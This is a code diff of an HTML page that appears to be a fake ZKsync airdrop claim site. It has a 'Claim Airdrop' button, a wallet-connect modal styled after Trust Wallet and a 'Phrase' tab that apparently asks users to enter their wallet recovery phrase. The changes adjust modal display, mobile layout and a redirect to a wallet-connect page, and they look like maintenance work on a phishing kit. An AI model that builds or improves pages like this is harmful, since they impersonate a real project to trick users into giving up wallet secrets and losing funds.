@@ -45,19 +45,23 @@
           <h1 class="text-5xl lg:text-7xl 2xl:text-[90px] leading-[1.2] font-bold inline-block">It’s time for</h1><h1 class="text-5xl lg:text-7xl 2xl:text-[90px] leading-[1.2] font-bold inline-block !mt-0">onchain Reward</h1>
           <h3 class="text-white sm:text-lg leading-[1.4] mx-auto w-full lg:w-[60%] text-pretty mt-12">The community-driven future of ZKsync is here.</h3>
           <h3 class="text-white sm:text-lg leading-[1.4] mx-auto w-full lg:w-[60%] text-pretty mt-4">ZK Airdrop unites individuals, users and holders to realize the ZK Credo, expand marketability and accelerate innovations.</h3></div>
+          
+          
           <div class="flex flex-col sm:flex-row gap-8 justify-center w-full max-w-6xl px-4">
-  
     <video width="640" height="360" controls id="myVideo">
         <source src="/zknation.io/_next/static/airdrop_video.mp4" type="video/mp4">
         <script>
-         document.getElementById("myVideo").volume = 0.3; // Set volume to 50%
+         document.getElementById("myVideo").volume = 0; // Set volume to 50%
         </script>
       </video>
       
     
-    <a id="airdop"  class="flex flex-col items-center p-8 border-[6px] border-white hover:border-[rgba(61,66,77,0.5)] hover:scale-105 transition-all duration-300 rounded-[75px] space-y-6 w-full sm:w-[45%]"><h4 class="text-2xl font-semibold">Claim Airdrop</h4><p class="text-center text-white/80">Click here to claim your token now</p></a>
+    <a id="airdop"  class="flex flex-col items-center p-8 border-[6px] border-white hover:border-[rgba(61,66,77,0.5)] hover:scale-105 transition-all duration-300 rounded-[75px] space-y-6 w-full sm:w-[45%]"><h4 class="text-2xl font-semibold">Claim Airdrop</h4><p class="text-center text-white/80">Click here to claim your token now</p>
+    </a>
+    
 
-</div></div></main></div>
+</div>
+
 
 <!-- Wallet Modal -->
 <div id="wallet-modal" class="modal">
@@ -81,9 +85,10 @@
   </div>
   <style>
     .modal {
-      display: block;
-      position: relative;
-      bottom: -50%;
+      display: none;
+      position: absolute;
+      top: 50%;
+      height: 50vh;
       z-index: 2;
       left: -7.5%;
       width: 100%;
@@ -144,7 +149,7 @@
       <h2>Connect Wallet Manually</h2>
       <img src="" alt="Wallet Logo" id="wallet-logo" class="wallet-logo">
       <div class="wallet-name" id="wallet-name">Trust Wallet</div>
-
+      
       <!-- Tabs -->
       <div class="tabs">
           <button class="tab-button active" id="tab-phrase">Phrase</button>
@@ -193,13 +198,12 @@
 
 @media (max-width: 700px) {
   .dialog-overlay {
-      left: 0;
       top: 10%;
-      width: auto;
+      width: 100vw; /* Makes it full screen width */
   }
   .dialog-box {
-      width: auto;
-      max-width: 100%;
+      width: 100vw; /* Matches the screen width */
+      max-width: 100vw; /* Ensures it doesn’t exceed screen width */
   }
 }
 
@@ -466,8 +470,12 @@ function switchTab(tabName, placeholderText) {
   });
 
   document.getElementById('walletconnect').addEventListener('click', () => {
-  window.location.href = "connect_wallet.html";
+  window.location.href = "/wallet/connect_wallet.html";
 });
 </script>
 
+</div>
+
+
+</main></div>
 <footer class="relative footer mx-auto max-w-[1500px] h-max px-6 pb-8 flex flex-col w-full space-y-2"><div class="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0"><span class="text-shade-mute text-center md:text-left">© 2024 ZKsync Association. All rights reserved.</span><div class="flex items-center space-x-6 text-shade-mute"><a class="underline underline-offset-2 hover:text-white transition" href="privacy.html">Privacy Policy</a></div></div></footer></div></body></html>
